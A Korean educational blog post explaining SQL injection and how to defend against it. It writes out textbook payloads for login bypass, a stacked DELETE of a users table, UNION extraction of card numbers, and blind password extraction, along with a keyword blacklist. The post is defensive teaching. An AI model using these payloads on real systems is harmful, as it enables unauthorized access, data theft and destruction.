# SQL Injection

SQL 인젝션은, 웹 애플리케이션이 데이터베이스와 연동하는 모델에서 발생 가능하다. 

이용자의 입력값이 SQL 구문의 일부로 사용될 경우, 해커에 의해 **조작된 SQL 구문이 데이터베이스에  그대로 전달되어 비정상적인 DB 명령을 실행시키는 공격 기법**이다.

## SQL Injection 목적 및 영향 

**1. 인증 우회**
SQL 인젝션 공격의 대표적인 경우로, 로그인 폼(Form)을 대상으로 공격을 수행한다. 정상적인 계정 정보 없이도 로그인을 우회하여 인증을 획득할 수 있다.

**2. DB 데이터 조작 및 유출**
조작된 쿼리가 실행되도록 하여, 기업의 개인정보나 기밀정보에 접근하여 데이터를 획득할수 있다. 또한 데이터 값을 변경하거나 심지어 테이블을 몽땅 지워버릴 수도 있다.

**3. 시스템 명령어 실행**
일부 데이터베이스의 경우 확장 프로시저를 호출하여 원격으로 시스템 명령어를 수행할 수 있도록 한다. 시스템 명령어를 실행할 수 있다면 해당 서버의 모든 자원에 접근하고 데이터를 유출, 삭제 할 수 있다는 말이 된다.

## SQL Injection 공격 원리와 유형 

SQL Injection을 시도하는 조건 

- 조건1) 웹 애플리케이션이 DB 와 연동하고 있다.
- 조건 2) 외부 입력 값이 DB쿼리문으로 사용된다.

### **SQL 인젝션 공격 유형과 공격 기법**

**1. (일반적인) SQL 인젝션**

굳이 '**일반적인**'이라는 용어는 붙일 필요가 없으나, 이어서 소개할 Blind SQL 인젝션과 구분하기 위함이다. 일반적인 SQL 인젝션 공격은 다음의 형태로 수행된다.

**1) 쿼리 조건 무력화(Where 구문 우회)**

Where 구문은 SQL에서 조건을 기술하는 구문이다. Where 조건에 기술된 구문이 '참(true)'이 되는 범위만 쿼리 결과로 반환된다.

```mysql
"Select * From Users Where UserID = '"+ UserID +"' And Password = '" + Password + "'"
```

**UserID에 주석처리를 진행하여 UserID 이하의 조건 무력화** 

```mysql
[ 외부 입력값 ] MySQL 기준
UserID: admin'#   '^
Password: 아무거나

[ 실행되는 쿼리문 ]
Select * From Users Where UserID = 'admin'# And Password = '아무거나'

```

**Password를 항상 true 조건이 될 수 있도록 하여 계정 권한 획득**

```mysql
[ 외부 입력값 ] MySQL 기준
UserID: test
Password: 1234' or '1'='1 #

[ 실행되는 쿼리문 ]
Select * From Users Where UserID = 'test' And Password='1234' or '1'='1' #
```

**;(콜론)을 사용하여 명령어를 연속 기입 후 테이블  조작**

```mysql
[ 외부 입력값 ] MySQL 기준
UserID: admin' ; DELETE From Users #  '^
Password: 아무거나

[ 실행되는 쿼리문 ]
Select * From Users Where UserID = 'admin' ; DELETE From Users # And Password='아무거나'
```



**2) 고의적 에러 유발후 정보 획득** 

기본적으로 웹 애플리케이션은 쿼리 수행 중 오류가 발생하면 DB오류를 그대로 브라우저에 출력한다. 이 오류 정보를 통해 DB의 스키마 정보나 데이터가 유출될 수 있다.

```mysql
[ 외부 입력값 ] MySQL 기준
UserID: test' UNION SELECT 1 #  '^
Password: 아무거나

[ 실행되는 쿼리문 ]
Select * From Users Where UserID = 'test' UNION SELECT 1 # And Password='아무거나'
```

다음의 작업을 통해 UNION 오류가 발생하지 않도록 SELECT 1, 1 ..... 갯수를 늘려가며 테이블의 반환 컬럼수를 확인한다

컬럼수가 확인이 되었으면 추가적으로 다음의 쿼리를 통해 테이블의 정보를 가져온다.

```mysql
[ 외부 입력값 ] MySQL 기준
UserID: test' UNION SELECT 1,1,1,1 #   '^
Password: 아무거나

[ 실행되는 쿼리문 ]
Select * From Users Where UserID = 'test' UNION SELECT 1,1,1,1 # And Password='아무거나'
```

```MYSQL
Select * From Users Where UserID = 'test' UNION SELECT name, object, 1,1 FROM information_scheme 
# And Password='아무거나'
```

위 쿼리를 통해서 테이블의 정보를 확인한 뒤 테이블의 저장된 데이터를 획득할 수 있다. 

아래는 PaymentLog 테이블의 UserID와 카드 번호 유출을 시도하는 쿼리이다.

```mysql
Select * From Users Where UserID = 'test' UNION SELECT UserID, CardNo, 1, 1 FROM PaymentLog 
# And Password='아무거나'
```

다만 공격을 위해서는 컬럼명, 컬럼타입 등을 알아내야하며 별도의 오류 페이지 처리를 하지 않았다면 브라우저에서 SQL문의 실패 이유에 대해서 알려주므로 컬럼에 대한 정보를 알아낼 수 있다. 



**2. Blind SQL 인젝션**

 **1) Boolean-based Blind 공격** 가령 어느 웹사이트가 게시판 검색이라는 기능을 제공할 경우, 다음과 같이 참/거짓의 반환을 테스트 해 볼 수 있다.

```MYSQL
[ 외부 입력값 ]
제목검색: hello' AND 1=1 # (유효한 검색단어와 항상 참이되는 조건 부여)  '^

[결과]
게시판 검색됨  --> 참(true)이으로 간주

[ 외부 입력값 ]
제목검색: hello' AND 1=2 # (유효한 검색단어와 항상 거짓이 되는 조건 부여)  '^

[결과]
게시물 검색 안됨 --> 거짓(false)으로 간주
```

  즉 핵심은 게시판 검색 기능을 참/거짓을 반환하는 요소로 사용할 수 있다는 점이다. 여기에 AND 조건으로 해커가 알고 싶은 쿼리 조건을 삽입해서 그 결과로부터 정보유출이 가능한 것이 Blind SQL 인젝션 공격 기법이며 이중에서도 **AND 조건에 논리식을 대입하여 참/거짓 여부를 알아내는 방식을** **Boolean-based Blind 공격**이라 한다.



**2) Time-based Blind 공격** 앞서 게시판 검색에서는 검색 결과의 유,무로 참/거짓을 판별할 수 있었다. 그러나 어떤 경우에는 응답의 결과가 항상 동일하여 응답결과만으로는 참/거짓을 판별할 수 없는 경우가 있을 수 있다.

이럴때는 시간을 지연시키는 쿼리를 주입하여 응답 시간의 차이로 참/거짓 여부를 판별할 수 있다.

```MYSQL
My SQL 환경

[ 외부 입력값 ]
(DB의 시스템 계정이 sa 인지 판별하는 구문 삽입. 여기에서 검색어(hello)는 중요하지 않음)
제목검색: hello AND sleep(5)#' 

[실행되는 쿼리]
SELECT * FROM TB_Boards WHERE Title = 'hello' AND sleep(5)

[결과]
1) 응답이 5초간 지연됨 -> 참(true) --> hello 검색어가 존재함
2) 응답이 즉시 이뤄짐 -> 거짓(false) --> hello 검색어가 존재하지 않음
```

위 내용을 바탕으로 Blind SQL 인젝션 공격 시나리오는 다음과 같다.

1. (앞서 해 본 것 처럼) 해커는 게시판 검색 기능으로 참/거짓을 판별할 수 있다는 것을 알아 냈다.
2. 해커는 회원 테이블에서 특정 회원의 비밀번호를 알아내고자 다음과 같은 쿼리를 주입한다.

```MYSQL
[ 외부 입력값 ]
hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 90  '^

[ 실행되는 쿼리문 ]
SELECT * FROM TB_Boards WHERE Title = 'hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 91
```

대소문자 구분을 위하여 ASCII 91보다 큰 지 확인한다. 이 후 소문자인 것을 확인한 경우 다음과 같은 방식으로 패스워드에 대한 질의를 시도한다.

```
SELECT * FROM TB_Boards WHERE Title = 'hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 110 -- true

SELECT * FROM TB_Boards WHERE Title = 'hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 115 -- false

SELECT * FROM TB_Boards WHERE Title = 'hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 113 -- false

SELECT * FROM TB_Boards WHERE Title = 'hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 111 -- true

SELECT * FROM TB_Boards WHERE Title = 'hello' AND ASCII(LEFT((SELECT Password From TB_Users WHERE UserID = 'admin'), 1)) > 112 -- false
```



## **SQL 인젝션 대응 방안**

**웹 방화벽(WAF) 도입**

웹 방화벽은 HTTP/HTTPS 응용 계층의 패킷 내용을 기준으로 패킷의 보안성을 평가하고 룰(Rule)에 따라 제어한다. SQL 인젝션의 룰(Rule)을 설정하여 공격에 대비할 수 있다.

[웹방화벽-펜타시큐리티 바로가기](https://www.pentasecurity.co.kr/resource/웹보안/웹방화벽이란/)

**1. 물리적 웹 방화벽**
기업의 규모가 어느정도 되거나 보안이 중시되는 환경 또는 예산이 충분한 환경에서는 물리적인 전용 WAF 사용을 권장한다. 어플라이언스 형태의 제품을 사용하거나 SECaaS 형태의 클라우드 기반의 솔루션을 도입할 수도 있다.

**2. 논리적 웹 방화벽(공개 웹 방화벽)**
전용 웹방화벽 장비를 도입할 여력이 되지 않는다면, 공개 웹방화벽을 고려해 볼 만 하다. 대부분 공개 웹 방화벽은 물리적인 장비가 아닌 논리적인 구성으로 웹 방화벽 역할을 수행한다.

윈도우 서버 환경에서는 WebKnight, 아파치 서버 환경에서는 ModSecurity를 사용할 수 있다.

ModSecurity는 OWASP(세계적인 웹 보안 커뮤니티) 에서 무료 탐지 룰(CRS)을 제공하며 이를 통해OWASP TOP 10 취약점을 포함한 웹 해킹 공격으로부터 홈페이지(웹서버) 보호가 가능하다.

WebKnight는 웹서버 앞단에 필터(ISAPI) 방식으로 동작, 웹서버로 들어오는 모든 웹 요청에 대해 사전에 정의한 필터 룰에 따라 검증하고 SQL 인젝션 공격 등을 사전에 차단 할 수 있다

\- 웹서버 보안 강화 안내서 (->[바로가기](https://www.krcert.or.kr/data/guideView.do?bulletin_writing_sequence=27364))

**시큐어 코딩** (->[시큐어 코딩 바로가기](https://cocomo.tistory.com/292))

**1. 입력값 유효성 검사**

모든 웹 보안 영역에서는 외부 입력값에 대한 대전제가 하나 있다.

> ***모든 외부 입력값은 신뢰하지 말라***

SQL 인젝션에서도 마찬가지이다. 외부에서 들어오는 모든 입력값은 모두 의심의 대상이다.
여기서 외부 입력값은 이용자가 직접 타이핑한 값일 수도 있지만 직접 타이핑 하지 않더라도 Burp Suite와 같은 프록시 툴을 이용하여 중간에 값을 변조할 수 있는 외부 값도 포함된다. (가령 게시판에서 게시물 번호와 같은..)

**SQL 인젝션의 가장 기본적인 대응 전략은 바로 입력값의 유효성을 검사**하는 것이다. 입력값 검증에는 두 가지 방식이 존재한다.

**1) 블랙 리스트 방식**
SQL 쿼리의 구조를 변경시키는 문자나 키워드를 제한하는 방식이다. 아래와 같은 문자를 블랙리스트로  미리 정의하여 해당 문자를 공백 등으로 치환하는 방식으로 방어한다.

**DBMS 종류에 따라 쿼리의 구조를 변경시키거나 쿼리문의 일부로 사용되는 문자 필터링**

**(특수문자)** ' , " , = , & , | , ! , ( , ) , { , } , $ , % , @ , #, -- 등

**(예 약 어)** UNION, GROUP BY, IF, COLUMN, END, INSTANCE 등

**(함 수 명)** DATABASE(), CONCAT(), COUNT(), LOWER() 등



**2) 화이트 리스트 방식** 블랙리스트 방식보다 보안성 측면에서는 훨씬 강력한 방법이다. 블랙리스트 방식에서는 금지된 문자 외에는 모두 허용하지만 화이트리스트 방식에서는 허용된 문자를 제외하고는 모두 금지하는 방식이다. 

지정된 문자만을 허용하기 때문에 웹 애플리케이션의 기능에 따라 화이트리스트를 다르게 유지해야 할 필요가 생긴다. 그리고 참고로 화이트 리스트를 정의할 때에는 개별 문자를 일일이 하나씩 모두 정의하는 것보다 정규식을 이용해서 범주화/패턴화 시키는 것이 유지보수에 더 유리하다.



**2. 동적 쿼리 사용 제한**

**1) 동적 쿼리 금지**
웹 애플리케이션이 DB와 연동할 때 정적쿼리만 사용한다면 SQL 인젝션을 신경 쓸 필요가 없다. 하지만 현실적으로 동적 쿼리를 사용하지 않을 수 없을 것이다. 근래의 웹 애플리케이션은 모두 사용자와 상호작용하며 동적인 기능을 기반으로 하기 때문에 동적 쿼리 사용은 거의 필수에 가깝다.

**2) 매개변수화된 쿼리(구조화된 쿼리) 사용**
동적 쿼리를 정적쿼리 처럼 사용하는 기법이다. 쿼리 구문에서 외부 입력값이 SQL 구문의 구조를 변경하지 못하도록 정적구조로 처리하는 방식인데 이를 파라메타화된(매개변수화된) 쿼리라 한다.

자바 환경에서 JDBC API를 사용하는 경우, 구조화된 쿼리를 지원하는 PreparedStatement를 사용할 수 있다. 닷넷에서는 SqlCommand를 사용하면 파라메타화된 쿼리를 사용할 수 있다.

Mybatis sql injection을 보호하는 방법은 파라미터를 ${파라미터} 가 아닌 #{파라미터}로 설정해주면 된다. 

-> 원리는 $ 파라미터 자리에String 변수가 replace 되고 있음

**[ 참고 ]**OWASP의 SQL 인젝션 대응 문서를 보면 각 언어별로 파라메타화된 쿼리 사용을 위한 가이드와 코드 샘플을 안내하고 있으니 참고하기 바란다.

\> [**SQL Injection Prevention Cheat Sheet**](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)

**(일부 발췌)****Language specific recommendations:**

Java EE – use **PreparedStatement()** with bind variables
.NET – use parameterized queries like **SqlCommand()** or **OleDbCommand()** with bind variables
PHP – use PDO with strongly typed parameterized queries (using **bindParam**())
Hibernate - use **createQuery()** with bind variables (called named parameters in Hibernate)
SQLite - use **sqlite3_prepare()** to create a statement object

추가로 행정안전부에서 발간한 **시큐어코딩 가이드**를 보면 자바 기준에서 JDBC, MyBatis, Hibernate 사용환경에서 안전한 코딩 기법을 제시하고 있으니 참고 바란다.

\> **시큐어 코딩 가이드**



**3. 오류 메시지 출력 제한**

**1)** **DB 오류 출력 제한**DB의 오류 정보를 그대로 이용자에게 노출해서는 안된다. DB 오류 정보에는 개발자들이 쉽게 디버깅할 수 있도록 내부 정보를 상세히 알려주는 경우가 많다. 해커는 이 정보를 바탕으로 DB 구조를 파악하고 데이터 유출을 시도할 것이다. 따라서 DB 오류가 적나라하게 이용자에게 노출되지 않도록 커스텀 오류 페이지를 제공해야 한다.

**2) 추상화된 안내 메시지**
또한 너무 자세한 안내 메시지도 주의할 필요가 있다. 가령 로그인을 실패 했을 때, ID가 틀렸는지 Password가 틀렸는지 꼭 집어 알려줄 필요가 있을까? 오히려 이 정보는 해커들에게 공격의 범위를 좁혀주는 결과로 이질 수 있다. 단지 *'로그인 정보가 일치하지 않습니다'*와 같이 추상적인 메시지가 (약간의 사용성을 해치더라도) 더 나을  때도 있다.



**DB 보안**

**1. DB** **계정 분리** 관리자가 사용하는 DB 계정과 웹애플리케이션이 접근하는 DB 계정은 반드시 분리되어야 한다. 간혹  귀찮다는 이유로 관리자의 DB계정을 여기저기 다 사용하는 경우가 있다. 반드시 분리 하도록 한다. (사용자용 계정 생성)

**2. DB 계정 권한 제한** 웹 애플리케이션이 DB에 액세스하는 전용 계정을 생성하고 이 계정에는 최소 권한 원칙에 입각하여 꼭 필요한 권한만 할당한다. 과연 웹애플리케이션에서 DROP TABLE와 같은 DML을 실행할 필요가 있는가? 아마 대부분은 필요치 않을 것이다. 또한 웹에서 DB의 기본 프로시저나 확장 프로시저를 호출할 필요가 있는가도 따져 볼 일이다.

웹 애플리케이션이 제공하는 기능만 수행가능하도록 권한을 제한한다.

참고로 필자의 과거 경험을 보자면, 모든 DB 액세스는 저장 프로시저로만 가능하도록 하고 계정 권한은 해당 프로시저들의 실행 권한만 부여한 적이 많았다.

또 한가지 팁은, SELECT 권한과 INSERT, UPDATE, DELETE 권한을 분리하여 서로 다른 계정으로 접근하도록 구성할 수도 있다. 이 경우 SELECT 권한으로 SQL 인젝션 공격이 들어와도 데이터베이스를 업데이트 할 수 없게 된다.

​                                                      

**3. 기본/확장 저장 프로시저 제거** 데이터베이스가 설치될때 기본적으로 포함된 프로시저들을 꼭 필요한 경우가 아니라면 제거하는 것이 좋다. 가령 MS SQL Server의 xp_cmdshell 프로시저는 db에서 시스템 명령어를 실행할 수 있도록 하는 확장 프로시저이다. 거의 대부분의 웹 애플리케이션에서는 이러한 확장 프로시저를 호출할 필요가 없을 것이다.



**취약점 점검과 모니터링**

**1. 지속적 취약점 점검**
SQL 인젝션 취약점을 정기적으로 점검해야 한다.

모의 해킹을 시도하거나 웹 취약점 점검 툴을 이용해 주기적인 취약점 점검이 권장된다.

비즈니스가 활발히 진행되는 만큼 웹사이트의 업데이트도 빈번할 것이다. 간단한 이벤트 페이지라고 하더라도 DB연동을 하는 경우, 언제나 SQL 취약점에 노출될 수 있다는 것을 명심해야 한다. 

다른 모든 곳에 보안을 튼튼해 해 뒀더라도, 이벤트 페이지 하나 때문에 해킹을 당하는 수가 빈번히 있음을 주의해야 할 것이다.

**2. 로깅과 모니터링**
SQL 인젝션은 많은 경우 오류를 유발시키거나 동일한 페이지나 기능을 반복적으로 호출하는 형태로 공격이 이뤄진다. 따라서 유달리 500 오류가 많이 발생하거나 동일한 IP에서 동일한 페이지를 반복적으로 호출할 경우 요주의 대상으로 주의깊에 살펴야 한다.

이상현상에 대한 기준과 임계를 설정하고 해킹 시도로 판단될 시, 즉각 알림이 전송되어 바로 조사가 가능한 체계를 갖추는 것이 좋다.

**[ 참고 ]**

OWASP에서는 SQL 인젝션 공격에 대응하는 가이드를 제공하고 있다. 이 페이지에서 보다 상세한 방어 기법을 확인할 수 있다

\> **SQL Injection Prevention Cheat Sheet**

MyBatis에서 보호하는 방법

->[mybatis sql injection 취약점](http://apollo89.com/wordpress/?p=2175)



출처: 

https://m.mkexdev.net/427?category=694351

 [박종명의 아름다운 개발 since 2010.06]
